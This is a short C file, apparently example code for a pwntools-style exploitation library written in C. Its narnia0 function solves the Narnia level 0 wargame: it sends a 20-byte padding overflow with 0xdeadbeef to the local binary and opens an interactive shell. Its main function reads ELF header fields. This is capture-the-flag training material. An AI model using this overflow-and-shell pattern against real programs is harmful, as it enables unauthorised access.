#include "../src/process.h"
#include "../src/str.h"
#include "../src/utils.h"
#include "../src/sock.h"
#include <assert.h>
#include "../src/tube.h"
#include "../src/pelf.h"


void narnia0() {
    // Spawn process
    Tube* p = pwn_process("./narnia0");

    // Almost all string in cpwn are handled by a custom dynamic string library `str`, which 
    // can handle binary safe strings (null terminator \x00 is threated like a regular char).
    // Below expression builds a payload. str_load() is a function which bundles multiple str pointers
    // Both str_new and pwn_64 returns a str*
    str* payload = str_load(
        str_new("KKKKKKKKKKKKKKKKKKKK"),
        pwn_p64(0xdeadbeef, "little")
    ); 

    // Send payload to process
    pwn_sendline(p, payload);

    // Spawn an interative shell
    pwn_interactive(p);
}


void narnia1() {

}

int main() {
    //narnia0();
    //tests();
    Elf* e = ELF64("/usr/bin/cat");
    printf("ELF size: %d\n", e->size);
    str* r = pwn_elf64_read(e, 0, 4); 
    printf("%s\n", e->endian);
    printf("%s\n", e->arch);
    printf("\n");
}



